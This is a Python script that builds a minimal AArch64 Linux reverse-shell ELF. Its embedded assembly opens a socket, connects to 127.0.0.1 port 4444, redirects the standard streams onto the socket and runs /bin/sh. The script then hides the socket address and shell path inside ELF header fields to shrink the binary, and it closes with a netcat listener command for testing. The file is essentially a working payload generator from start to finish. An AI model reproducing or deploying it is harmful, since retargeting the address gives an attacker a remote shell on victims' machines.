#!/usr/bin/env python3
"""
Build a minimal AArch64 reverse shell ELF executable.
Data is embedded in ELF header clobberable fields to reduce size.

FIXES compared to original:
1. ADR immhi extraction: & 0x7ffff (19 bits), not & 0xfffff (20 bits)
2. immlo extraction: 2 bits (bits[30:29]), not 1 bit
3. imm21 = (immhi << 2) | immlo, not (immhi << 1) | immlo
4. Sign extension fixed for Python arbitrary-precision integers
5. .balign 8,0 uses zero fill instead of NOP padding
"""

import struct
import subprocess
import os
import sys
import tempfile

BASE = 0x10000          # Load address
TOTAL_HEADER_SIZE = 120  # 64 (ehdr) + 56 (phdr)
SOCKADDR_VAL = 0x0100007f5c110002  # AF_INET=2, port=4444(nbo), 127.0.0.1
BINSH_BYTES = b'/bin/sh\x00'


def adr_decode(inst):
    """
    Decode AArch64 ADR instruction.
    Encoding: 0-immlo[2:1]-1-0000-immhi[23:5]-Rd[4:0]
    immlo = bits[30:29], immhi = bits[23:5]
    imm21 = sign_extend(immhi[18:0] : immlo[1:0])
    Returns (rd, imm21) where imm21 is signed byte offset.
    """
    rd = inst & 0x1f
    immlo = (inst >> 29) & 3            # 2 bits
    immhi = (inst >> 5) & 0x7ffff        # 19 bits
    imm21 = (immhi << 2) | immlo         # 21-bit unsigned
    # Sign extend from 21 bits
    if imm21 & 0x100000:
        imm21 |= ~0x1fffff
    return rd, imm21


def adr_encode(rd, imm21):
    """
    Encode AArch64 ADR instruction.
    imm21 must be in range [-1048576, 1048575] (±1MB).
    """
    imm21 = imm21 & 0x1fffff
    immlo = imm21 & 3
    immhi = (imm21 >> 2) & 0x7ffff
    return 0x10000000 | (immlo << 29) | (immhi << 5) | rd


def corrected_asm():
    """Assembly with data before code, _start jumps over data."""
    return '''
    .arch armv8-a
    .text
    .global _start
_start:
    b code_body
    .balign 8, 0
sockaddr_data:
    .quad 0x0100007f5c110002
binsh_data:
    .asciz "/bin/sh"
code_body:
    /* socket(AF_INET=2, SOCK_STREAM=1, 0) */
    mov x0, #2
    mov x1, #1
    mov x8, #198
    svc #0
    mov x5, x0

    /* connect(sockfd, &sa, 16) */
    adr x0, sockaddr_data
    ldr x0, [x0]
    stp x0, xzr, [sp, #-16]!
    mov x0, x5
    mov x1, sp
    mov x2, #16
    mov x8, #203
    svc #0

    /* dup3 chain: stdin, stdout, stderr */
    mov x0, x5
    mov x1, xzr
    mov x2, xzr
    mov x8, #24
    svc #0
    mov x1, #1
    svc #0
    mov x1, #2
    svc #0

    /* execve("/bin/sh", argv, NULL) */
    adr x0, binsh_data
    stp x0, xzr, [sp, #-16]!
    mov x1, sp
    mov x2, xzr
    mov x8, #221
    svc #0
'''


def build_elf_with_headers(raw_code):
    """Wrap raw code in ELF headers with data embedded."""
    SOCKADDR_BYTES = struct.pack('<Q', SOCKADDR_VAL)

    sockaddr_off = raw_code.find(SOCKADDR_BYTES)
    binsh_off = raw_code.find(BINSH_BYTES)

    print(f"  sockaddr at raw offset {sockaddr_off:#x}")
    print(f"  binsh at raw offset {binsh_off:#x}")

    data_end = binsh_off + 8
    real_code = raw_code[data_end:]
    print(f"  Real code at offset {data_end:#x}, {len(real_code)} bytes")

    code = bytearray(real_code)

    # Patch ADR instructions to point into ELF header
    for i in range(0, len(code) - 4, 4):
        inst = struct.unpack('<I', code[i:i+4])[0]

        # Check for ADR: bits[31:29] = 000, bits[28:24] = 10000
        if (inst >> 24) == 0x10 and ((inst >> 28) & 1):
            rd, old_imm21 = adr_decode(inst)
            old_target_in_realcode = i + old_imm21
            old_abs_in_raw = data_end + old_target_in_realcode

            new_target = None
            name = None

            if old_abs_in_raw == sockaddr_off:
                new_target = 0x08   # e_ident[8:15]
                name = "sockaddr"
            elif old_abs_in_raw == binsh_off:
                new_target = 0x28   # e_shoff
                name = "binsh"

            if new_target is not None:
                new_imm21 = new_target - TOTAL_HEADER_SIZE - i
                print(f"  ADR X{rd} at [{i:#x}]: {name} -> header+{new_target:#x} (offset={new_imm21:#x})")

                if new_imm21 < -0x100000 or new_imm21 > 0xfffff:
                    print(f"    ERROR: offset out of range!")
                    continue

                new_inst = adr_encode(rd, new_imm21)
                code[i:i+4] = struct.pack('<I', new_inst)
                print(f"    {inst:#010x} -> {new_inst:#010x}")

    # --- Build ELF ---
    total_size = TOTAL_HEADER_SIZE + len(code)

    # ELF Header
    ehdr = bytearray(64)
    ehdr[0:4] = b'\x7fELF'
    ehdr[4] = 2     # 64-bit
    ehdr[5] = 1     # LE
    ehdr[6] = 1     # version
    ehdr[7] = 0     # OS/ABI

    # e_ident[8:15] = sockaddr_in (clobbered)
    struct.pack_into('<Q', ehdr, 8, SOCKADDR_VAL)

    struct.pack_into('<H', ehdr, 0x10, 2)      # ET_EXEC
    struct.pack_into('<H', ehdr, 0x12, 0xb7)   # EM_AARCH64
    struct.pack_into('<I', ehdr, 0x14, 1)      # version
    struct.pack_into('<Q', ehdr, 0x18, BASE + TOTAL_HEADER_SIZE)  # e_entry
    struct.pack_into('<Q', ehdr, 0x20, 64)     # e_phoff

    # e_shoff = /bin/sh\0 (clobbered)
    struct.pack_into('<Q', ehdr, 0x28, int.from_bytes(BINSH_BYTES, 'little'))

    struct.pack_into('<I', ehdr, 0x30, 0)      # e_flags
    struct.pack_into('<H', ehdr, 0x34, 64)     # e_ehsize
    struct.pack_into('<H', ehdr, 0x36, 56)     # e_phentsize
    struct.pack_into('<H', ehdr, 0x38, 1)      # e_phnum
    struct.pack_into('<H', ehdr, 0x3a, 0)      # e_shentsize
    struct.pack_into('<H', ehdr, 0x3c, 0)      # e_shnum
    struct.pack_into('<H', ehdr, 0x3e, 0)      # e_shstrndx

    # Program Header
    phdr = bytearray(56)
    struct.pack_into('<I', phdr, 0, 1)          # p_type = PT_LOAD
    struct.pack_into('<I', phdr, 4, 7)          # p_flags = RWX
    struct.pack_into('<Q', phdr, 8, 0)           # p_offset = 0
    struct.pack_into('<Q', phdr, 0x10, BASE)     # p_vaddr
    struct.pack_into('<Q', phdr, 0x18, 0)        # p_paddr
    struct.pack_into('<Q', phdr, 0x20, total_size)  # p_filesz
    struct.pack_into('<Q', phdr, 0x28, total_size)  # p_memsz
    struct.pack_into('<Q', phdr, 0x30, 1)        # p_align

    return bytes(ehdr) + bytes(phdr) + bytes(code)


def main():
    print("=== Building Minimal AArch64 Reverse Shell ===\n")

    asm = corrected_asm()

    with tempfile.TemporaryDirectory() as tmpdir:
        asm_file = os.path.join(tmpdir, 'rev.S')
        obj_file = os.path.join(tmpdir, 'rev.o')
        elf_file = os.path.join(tmpdir, 'rev.elf')
        raw_file = os.path.join(tmpdir, 'rev.bin')

        with open(asm_file, 'w') as f:
            f.write(asm)

        print("Assembling...")
        subprocess.run(['aarch64-linux-gnu-as', '-o', obj_file, asm_file],
                       check=True, capture_output=True)

        print("Linking (at address 0)...")
        subprocess.run([
            'aarch64-linux-gnu-ld', '-N', '--omagic', '-s',
            '-Ttext=0', '-o', elf_file, obj_file
        ], check=True, capture_output=True)

        print("Extracting raw binary...")
        subprocess.run([
            'aarch64-linux-gnu-objcopy', '--strip-section-headers',
            '-O', 'binary', elf_file, raw_file
        ], check=True, capture_output=True)

        with open(raw_file, 'rb') as f:
            raw_code = f.read()

        print(f"Raw code size: {len(raw_code)} bytes\n")

        print("Original disassembly (pre-patch):")
        subprocess.run(['aarch64-linux-gnu-objdump', '-d', elf_file])
        print()

    print("Building final ELF with header-embedded data...")
    elf_binary = build_elf_with_headers(raw_code)

    output = 'rev_minimal'
    with open(output, 'wb') as f:
        f.write(elf_binary)
    os.chmod(output, 0o755)

    print(f"\n=== RESULT ===")
    print(f"Output: {output}")
    print(f"Size: {len(elf_binary)} bytes")

    print(f"\nHex dump:")
    for i in range(0, len(elf_binary), 16):
        hex_bytes = ' '.join(f'{b:02x}' for b in elf_binary[i:i+16])
        ascii_repr = ''.join(chr(b) if 32 <= b < 127 else '.'
                            for b in elf_binary[i:i+16])
        print(f"{i:04x}: {hex_bytes:<48s} {ascii_repr}")

    try:
        print("\nReadelf:")
        subprocess.run(['readelf', '-h', output])
        print()
        subprocess.run(['readelf', '-l', output])
    except FileNotFoundError:
        pass

    print("\nTo test:  qemu-aarch64 ./rev_minimal")
    print("Listener: nc -lvnp 4444")


if __name__ == '__main__':
    main()
